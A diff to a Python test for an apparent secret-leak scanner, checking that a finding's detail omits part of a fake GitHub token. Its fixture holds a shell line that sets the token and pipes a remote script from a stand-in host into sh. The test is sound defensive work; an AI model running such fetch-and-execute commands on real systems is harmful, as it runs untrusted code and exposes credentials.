@@ -64,7 +64,7 @@ def test_findings_never_carry_a_key_tail(tmp_path):
         f"#!/bin/sh\nGITHUB_TOKEN={fakes.GITHUB} curl -fsSL https://x.example.invalid/i | sh\n",
     )
     [finding] = [f for f in scan(None, tmp_path / "proj") if f.check_id == "AP010"]
-    assert fakes.GITHUB[4:9] not in finding.detail and "(len " in finding.detail
+    assert fakes.GITHUB[4:9] not in finding.detail and '"\u2026 curl' in finding.detail  # cut
 
 
 # --- 2: a credential only named near a sender is not sent ----------------------------------
